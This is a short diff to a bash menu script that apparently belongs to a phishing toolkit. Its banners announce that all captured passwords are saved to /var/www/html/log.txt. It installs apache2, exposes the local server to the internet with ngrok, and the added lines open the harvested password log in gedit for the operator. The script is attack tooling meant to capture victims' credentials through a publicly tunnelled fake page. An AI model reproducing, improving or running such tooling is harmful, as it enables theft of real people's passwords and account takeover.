@@ -62,6 +62,8 @@ case $Choice in
 		printf "                                \e[210m\e[1;99m ALERT +++++++++++++++++++++ Step 2 - All Password save on /var/www/html/log.txt ++++++++++++++ \e[0m\n"
 		sleep 11
 		./ngrok http 80
+		cd /var/www/html/
+		gedit log.txt
 		;;
 	        2) apt-get install apache2
 		hostnamectl
@@ -83,6 +85,8 @@ case $Choice in
 		printf "                                                     \e[210m\e[1;99m ALERT ++++++++++++++++++++ Step 2 - All Password Sve on /var/www/html/log.txt ++++++++++++++ \e[0m\n"
 		sleep 11
 		./ngrok http 80 
+		cd /var/www/html/
+		gedit log.txt
 		;;
                 esac
                 ;;
@@ -107,7 +111,10 @@ case $Choice in
 		printf "                                                                                                                                                                                                                         \e[101m\e[1;77m ALERT +++++++++++++++++++ Step 2 - All Password Save on /var/www/html/log.txt ++++++++++++ \e[0m\n"
 		sleep 11
 		./ngrok http 80
-                ;;
+                cd /var/www/html/
+		gedit log.txt
+		;;
+	
 esac
 
 
